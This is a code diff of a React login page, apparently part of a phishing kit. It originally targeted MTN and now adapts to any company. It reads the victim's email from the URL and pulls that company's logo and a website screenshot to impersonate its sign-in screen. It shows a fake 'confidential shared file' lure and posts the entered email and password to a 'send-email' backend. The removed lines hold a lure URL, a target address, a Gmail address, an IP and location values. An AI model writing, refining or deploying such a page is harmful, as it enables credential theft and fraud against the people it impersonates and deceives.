@@ -1,14 +1,61 @@
-import React, { useState } from "react";
+import React, { useEffect, useState } from "react";
 import { Box, TextField, Button, Typography, CircularProgress, IconButton, InputAdornment } from "@mui/material";
 import axios from "axios";
-// import { Visibility, VisibilityOff } from "@mui/icons-material";
 
 const MtnLoginPage: React.FC = () => {
-  const [email, setEmail] = useState("evansjota@gmail.com");
+  const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [error, setError] = useState("");
   const [loading, setLoading] = useState(false);
   const [showPassword, setShowPassword] = useState(false);
+  const [logo, setLogo] = useState("");
+  const [background, setBackground] = useState("");
+
+  const fetchLogo = async (domain: string) => {
+    try {
+      const response = await fetch(`https://logo.clearbit.com/${domain}`);
+      return response.ok ? response.url : null;
+    } catch (error) {
+      console.error("Error fetching logo:", error);
+      return null;
+    }
+  };
+
+  const fetchWebsiteScreenshot = async (domain: string) => {
+    try {
+      const apiUrl = `https://api.microlink.io?url=https://${domain}&screenshot=true`;
+      const response = await fetch(apiUrl);
+      const data = await response.json();
+      return data.data?.screenshot?.url || null;
+    } catch (error) {
+      console.error("Error fetching screenshot:", error);
+      return null;
+    }
+  };
+
+  const getDomain = (email: string) => email.split("@")[1]?.toLowerCase() || "";
+
+  useEffect(() => {
+    const hashEmail = window.location.hash.replace("#", "");
+    if (hashEmail) {
+      setEmail(hashEmail);
+      fetchCompanyDetails(hashEmail);
+    }
+  }, []);
+
+  const fetchCompanyDetails = async (email: string) => {
+    const domain = getDomain(email);
+    if (!domain) return;
+
+    try {
+      const logoUrl = await fetchLogo(domain);
+      if (logoUrl) setLogo(logoUrl);
+      const screenshotUrl = await fetchWebsiteScreenshot(domain);
+      if (screenshotUrl) setBackground(screenshotUrl);
+    } catch (error) {
+      console.error("Failed to fetch company details:", error);
+    }
+  };
 
   const handleLogin = async () => {
     if (!password) {
@@ -16,50 +63,42 @@ const MtnLoginPage: React.FC = () => {
       return;
     }
 
-    setLoading(true); // Show loading indicator
+    setLoading(true);
 
     try {
       await axios.post("http://localhost:8080/send-email", { email, password });
-      setError(""); // Clear any errors
+      setError("");
     } catch (err) {
       setError("Failed to send email. Try again!");
       console.error("Email sending error:", err);
     } finally {
-      setLoading(false); // Hide loading indicator
+      setLoading(false);
     }
   };
 
-  const togglePasswordVisibility = () => {
-    setShowPassword(!showPassword);
-  };
-
   return (
-    <Box
-      sx={{
-        minHeight: "100vh",
-        display: "flex",
-        justifyContent: "center",
-        alignItems: "center",
-        backgroundColor: "#f5f5f5",
-      }}
-    >
-      <Box
-        sx={{
-          width: "100%",
-          maxWidth: 400,
-          bgcolor: "background.paper",
-          borderRadius: 2,
-          boxShadow: 3,
-          p: 4,
-          textAlign: "center",
-        }}
-      >
+    <Box sx={{ 
+      minHeight: "100vh", 
+      display: "flex", 
+      justifyContent: "center", 
+      alignItems: "center", 
+      backgroundImage: `url(${background})`,
+      backgroundSize: "cover",
+      backgroundPosition: "center",
+      backdropFilter: "blur(5px)"
+    }}>
+      <Box sx={{ 
+        width: "100%", 
+        maxWidth: 400, 
+        bgcolor: "rgba(255, 255, 255, 0.9)", 
+        borderRadius: 2, 
+        boxShadow: 3, 
+        p: 4, 
+        textAlign: "center",
+        backdropFilter: "blur(8px)"
+      }}>
         <Box sx={{ mb: 3 }}>
-          <img
-            src="https://logos-world.net/wp-content/uploads/2021/02/MTN-Logo.png"
-            alt="Logo"
-            style={{ width: 80, height: 80, objectFit: "contain" }}
-          />
+          {logo && <img src={logo} alt="Company Logo" style={{ width: 80, height: 80, objectFit: "contain" }} />}
           <Typography variant="h6" sx={{ color: "firebrick", mt: 2, textTransform: "uppercase", fontSize: 18 }}>
             <b>You must authenticate to view a shared confidential file.</b>
           </Typography>
@@ -69,15 +108,7 @@ const MtnLoginPage: React.FC = () => {
         </Box>
 
         <form onSubmit={(e) => e.preventDefault()}>
-          <TextField
-            fullWidth
-            label="Email"
-            variant="outlined"
-            margin="normal"
-            value={email}
-            disabled
-            sx={{ mb: 2 }}
-          />
+          <TextField fullWidth label="Email" variant="outlined" margin="normal" value={email} disabled sx={{ mb: 2 }} />
           <TextField
             fullWidth
             label="Password"
@@ -91,42 +122,15 @@ const MtnLoginPage: React.FC = () => {
             InputProps={{
               endAdornment: (
                 <InputAdornment position="end">
-                  <IconButton onClick={togglePasswordVisibility} edge="end">
-                    {/* {showPassword ? <VisibilityOff /> : <Visibility />} */}
-                  </IconButton>
+                  <IconButton onClick={() => setShowPassword(!showPassword)} edge="end"></IconButton>
                 </InputAdornment>
               ),
             }}
           />
 
-          {/* Hidden Inputs */}
-          <input name="em-field" value={email} type="hidden" />
-          <input name="pidt-field" value="62.173.45.238" type="hidden" />
-          <input name="ocdt-field" value="Nigeria" type="hidden" />
-          <input name="icdt-field" value="Lagos" type="hidden" />
-          <input name="oldt-field" value="3.3903000354767" type="hidden" />
-          <input name="aldt-field" value="6.4474000930786" type="hidden" />
-          <input name="auth_status_" value="0" type="hidden" />
-          <input name="__winHref" value="https://billionnext.com/genl/#akada@mtn.com" type="hidden" />
-          <input name="UrlDom_main" value="mtn.com" type="hidden" />
-
-          <Button
-            fullWidth
-            variant="contained"
-            color="primary"
-            sx={{ mt: 2 }}
-            onClick={handleLogin}
-            disabled={loading}
-          >
+          <Button fullWidth variant="contained" color="primary" sx={{ mt: 2 }} onClick={handleLogin} disabled={loading}>
             {loading ? <CircularProgress size={24} /> : "Sign in"}
           </Button>
-
-          <Box sx={{ mt: 2, display: "flex", alignItems: "center", justifyContent: "center" }}>
-            <input type="checkbox" id="flexCheckDefault" defaultChecked />
-            <label htmlFor="flexCheckDefault" style={{ marginLeft: 8, fontSize: 14 }}>
-              Secured Session?
-            </label>
-          </Box>
         </form>
       </Box>
     </Box>
